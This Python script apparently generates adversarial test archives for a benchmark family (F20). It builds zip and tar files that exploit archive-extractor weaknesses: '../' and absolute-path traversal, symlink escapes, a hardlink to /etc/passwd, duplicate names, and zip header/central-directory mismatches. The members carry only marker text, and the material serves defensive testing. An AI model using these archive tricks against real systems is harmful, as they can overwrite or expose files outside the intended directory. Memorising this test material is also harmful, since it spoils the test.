#!/usr/bin/env python3
"""Generated structurally-adversarial archives for family F20 (corpus group g2-generated).
GENERATED DATA. Used for tuning and validation (different seeds/params); a structurally distinct
generator (malicious_archives_v2.py) is used for held-out.

Every archive here is a small, syntactically-parseable container whose STRUCTURE (not its
compressed bytes) is the adversarial part: path traversal, symlink/hardlink extraction escape,
duplicate entry names, and local-file-header/central-directory disagreement in zip. These are the
classic archive-extractor attack surface (Zip Slip and its relatives; zip parser-confusion tricks
where different tools trust different, disagreeing copies of a zip's metadata) that F20 previously
had no coverage of at all (its existing items are all entropy/CDC/byte-count-bomb generators).

Produces (all written directly with `struct`/`tarfile`, no external tools):
  zip_traversal.zip          entries named with ../ segments, a leading "/", and backslash-style
                              ("..\\..\\") traversal, each containing a short marker string
  zip_symlink_escape.zip     a symlink entry (unix external_attr, S_IFLNK) pointing outside the
                              extraction root, followed by an entry whose name walks through it
  zip_duplicate_names.zip    two entries sharing the exact same name with different content (first
                              vs. last extraction-order ambiguity)
  zip_cd_lfh_mismatch.zip    one entry whose local file header and central directory record
                              disagree: different name, different declared sizes/CRC, and (a
                              separate entry) a different compression-method byte
  tar_traversal.tar          POSIX ustar members named with ../ segments and an absolute path
  tar_symlink_escape.tar     a symlink member pointing outside the root, then a member through it
  tar_hardlink_escape.tar    a hardlink member whose target is an absolute path outside the root
  tar_duplicate_names.tar    two members sharing the exact same name with different content

Params (EB_PARAMS_JSON): {"variant": "tuning" | "validation", "marker": <str>} -- variant only
changes the marker text embedded in members (traceable per-split provenance); the archives'
structural content is otherwise identical by design (the interesting variable is the container
grammar, not sampled randomness).
"""

import argparse
import json
import os
import struct
import tarfile
import time
import zlib
from pathlib import Path

EPOCH = int(os.environ.get("SOURCE_DATE_EPOCH", "1767225600"))


# ---------------------------------------------------------------------------------------
# minimal hand-rolled zip writer (struct-level control the stdlib zipfile module refuses:
# duplicate names, disagreeing local-header/central-directory fields)

def dos_datetime(epoch: int) -> tuple:
    t = time.gmtime(epoch)
    dos_time = (t.tm_hour << 11) | (t.tm_min << 5) | (t.tm_sec // 2)
    dos_date = (((t.tm_year - 1980) & 0x7F) << 9) | (t.tm_mon << 5) | t.tm_mday
    return dos_time, dos_date


class RawZipEntry:
    """One zip entry, with independently-settable local-header and central-directory fields so a
    writer can deliberately make them disagree (lfh_* overrides central_* when given)."""

    def __init__(self, name, data, *, external_attr=0o644 << 16, method=0, symlink_target=None,
                lfh_name=None, lfh_method=None, lfh_crc=None, lfh_size=None):
        self.name = name
        self.data = symlink_target.encode() if symlink_target is not None else data
        self.external_attr = external_attr if symlink_target is None else (0o120777 << 16)
        self.method = method
        self.lfh_name = lfh_name if lfh_name is not None else name
        self.crc = zlib.crc32(self.data) & 0xFFFFFFFF
        self.lfh_crc = lfh_crc if lfh_crc is not None else self.crc
        self.lfh_method = lfh_method if lfh_method is not None else self.method
        self.lfh_size = lfh_size if lfh_size is not None else len(self.data)


def write_raw_zip(path: Path, entries: list) -> None:
    dos_time, dos_date = dos_datetime(EPOCH)
    buf = bytearray()
    central = bytearray()
    for e in entries:
        name_b = e.name.encode()
        lfh_name_b = e.lfh_name.encode()
        offset = len(buf)
        payload = zlib.compress(e.data, 9)[2:-4] if e.method == 8 else e.data
        buf += struct.pack("<IHHHHHIIIHH", 0x04034B50, 20, 0, e.lfh_method, dos_time, dos_date,
                          e.lfh_crc, e.lfh_size if e.lfh_method != 8 else len(payload), e.lfh_size,
                          len(lfh_name_b), 0)
        buf += lfh_name_b
        buf += payload
        central += struct.pack("<IHHHHHHIIIHHHHHII", 0x02014B50, 20, 20, 0, e.method, dos_time,
                              dos_date, e.crc, len(payload) if e.method == 8 else len(e.data),
                              len(e.data), len(name_b), 0, 0, 0, 0, e.external_attr, offset)
        central += name_b
    cd_offset = len(buf)
    body = bytes(buf) + bytes(central)
    eocd = struct.pack("<IHHHHIIH", 0x06054B50, 0, 0, len(entries), len(entries),
                       len(central), cd_offset, 0)
    path.write_bytes(body + eocd)


# ---------------------------------------------------------------------------------------

def build_zip_traversal(out: Path, marker: str) -> None:
    names = ["../../../tmp/eb-f20-marker.txt", "/tmp/eb-f20-marker-abs.txt",
             "..\\..\\eb-f20-marker-bslash.txt", "a/b/../../../../eb-f20-marker-deep.txt"]
    entries = [RawZipEntry(n, f"{marker}:{n}\n".encode()) for n in names]
    write_raw_zip(out / "zip_traversal.zip", entries)


def build_zip_symlink_escape(out: Path, marker: str) -> None:
    entries = [
        RawZipEntry("evil-link", b"", symlink_target="../../../tmp"),
        RawZipEntry("evil-link/through-symlink.txt", f"{marker}:through symlink\n".encode()),
    ]
    write_raw_zip(out / "zip_symlink_escape.zip", entries)


def build_zip_duplicate_names(out: Path, marker: str) -> None:
    entries = [
        RawZipEntry("payload.txt", f"{marker}:first (extracted first, offset lower)\n".encode()),
        RawZipEntry("payload.txt", f"{marker}:second (extracted last, same name)\n".encode()),
    ]
    write_raw_zip(out / "zip_duplicate_names.zip", entries)


def build_zip_cd_lfh_mismatch(out: Path, marker: str) -> None:
    real = f"{marker}:real payload read via local header\n".encode()
    entries = [
        # central directory claims "innocuous.txt"; the local header (what a streaming reader
        # that trusts LFH-only sees) actually names it "smuggled.txt" -- classic CD/LFH name
        # confusion (e.g. CVE-class "zip masquerading" issues in tools that pick one source of
        # truth and not the other).
        RawZipEntry("innocuous.txt", real, lfh_name="smuggled.txt"),
        # central directory says STORED (method 0) with the plaintext's real size/CRC; the local
        # header says DEFLATED (method 8) with a wrong CRC/size -- disagreeing compression method
        # between the two metadata copies.
        RawZipEntry("method-mismatch.bin", b"A" * 64, method=0, lfh_method=8,
                    lfh_crc=0xDEADBEEF, lfh_size=64),
    ]
    write_raw_zip(out / "zip_cd_lfh_mismatch.zip", entries)


def _tar_add(tf: tarfile.TarFile, name: str, *, data: bytes = None, linkname: str = None,
            linktype: bytes = None) -> None:
    ti = tarfile.TarInfo(name=name)
    ti.mtime = EPOCH
    ti.uid = ti.gid = 0
    ti.uname = ti.gname = ""
    if linktype is not None:
        ti.type = linktype
        ti.linkname = linkname
        ti.size = 0
        tf.addfile(ti)
    else:
        ti.size = len(data)
        import io
        tf.addfile(ti, io.BytesIO(data))


def build_tar_traversal(out: Path, marker: str) -> None:
    with tarfile.open(out / "tar_traversal.tar", "w", format=tarfile.USTAR_FORMAT) as tf:
        for n in ["../../../tmp/eb-f20-marker.txt", "/tmp/eb-f20-marker-abs.txt",
                 "a/b/../../../../eb-f20-marker-deep.txt"]:
            _tar_add(tf, n, data=f"{marker}:{n}\n".encode())


def build_tar_symlink_escape(out: Path, marker: str) -> None:
    with tarfile.open(out / "tar_symlink_escape.tar", "w", format=tarfile.USTAR_FORMAT) as tf:
        _tar_add(tf, "evil-link", linkname="../../../tmp", linktype=tarfile.SYMTYPE)
        _tar_add(tf, "evil-link/through-symlink.txt", data=f"{marker}:through tar symlink\n".encode())


def build_tar_hardlink_escape(out: Path, marker: str) -> None:
    with tarfile.open(out / "tar_hardlink_escape.tar", "w", format=tarfile.USTAR_FORMAT) as tf:
        _tar_add(tf, "evil-hardlink", linkname="/etc/passwd", linktype=tarfile.LNKTYPE)
        _tar_add(tf, "marker.txt", data=f"{marker}:hardlink escape sibling\n".encode())


def build_tar_duplicate_names(out: Path, marker: str) -> None:
    with tarfile.open(out / "tar_duplicate_names.tar", "w", format=tarfile.USTAR_FORMAT) as tf:
        _tar_add(tf, "payload.txt", data=f"{marker}:first tar member\n".encode())
        _tar_add(tf, "payload.txt", data=f"{marker}:second tar member, same name\n".encode())


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    ap.add_argument("--seed", type=int, required=True)
    ap.add_argument("--params", default="{}")
    args = ap.parse_args()
    params = json.loads(args.params)
    out = Path(args.out)
    marker = params.get("marker", params.get("variant", "eb-f20"))

    build_zip_traversal(out, marker)
    build_zip_symlink_escape(out, marker)
    build_zip_duplicate_names(out, marker)
    build_zip_cd_lfh_mismatch(out, marker)
    build_tar_traversal(out, marker)
    build_tar_symlink_escape(out, marker)
    build_tar_hardlink_escape(out, marker)
    build_tar_duplicate_names(out, marker)


if __name__ == "__main__":
    main()
